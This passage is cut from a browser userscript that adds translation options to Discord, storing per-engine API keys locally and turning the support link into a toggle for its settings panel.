                    GM_setValue('GMDiscordTrsEngine', e);
                    GM_setValue('GMDiscordTrsEngineAppKey_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsApiKey);
                    GM_setValue('GMDiscordTrsEngineAppId_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsAppId);
                    var appk = GM_getValue('GMDiscordTrsEngineAppKey_' + e);
                    var appi = GM_getValue('GMDiscordTrsEngineAppId_' + e);
                    if (appk) {
                        GM_setValue('GMDiscordTrsApiKey', appk);
                        GMDiscordTrsOpt.GMDiscordTrsApiKey = appk;
                    } else {
                        GM_setValue('GMDiscordTrsApiKey', "");
                        GMDiscordTrsOpt.GMDiscordTrsApiKey = "";
                    }
                    if (appi) {
                        GM_setValue('GMDiscordTrsAppId', appi);
                        GMDiscordTrsOpt.GMDiscordTrsAppId = appi;
                    } else {
                        GM_setValue('GMDiscordTrsAppId', "");
                        GMDiscordTrsOpt.GMDiscordTrsAppId = "";
                    }
                    GMDiscordTrsOpt.GMDiscordTrsEngineLast = e;
                    toggleOptions();
                    toggleOptions();
                }
            })(e);
            wrap.insertAdjacentElement('beforeend', inputTrsEngine);
            wrap.insertAdjacentHTML('beforeend', " " + e + " ");
        });

        wrap.insertAdjacentHTML('beforeend', "<br> ");
        var fromSpan = document.createElement("span");
        var toSpan = document.createElement("span");
        fromSpan.innerText = "Src Lang: ";
        toSpan.innerText = "Dst Lang: ";
        appendLangTrsSelect(fromSpan, toSpan);
        wrap.insertAdjacentElement('beforeend', fromSpan);
        wrap.insertAdjacentElement('beforeend', toSpan);
        document.body.insertAdjacentElement('beforeend', wrap);
    }

    setInterval(function() {
        var target = document.querySelector('a[href="https://support.discord.com"]');
        if (target) {
            target.onclick = function(ev) {
                ev.preventDefault();
                ev.stopImmediatePropagation();
                ev.stopPropagation();
                toggleOptions();
            }
        }
    },
                100);
})();
})})()
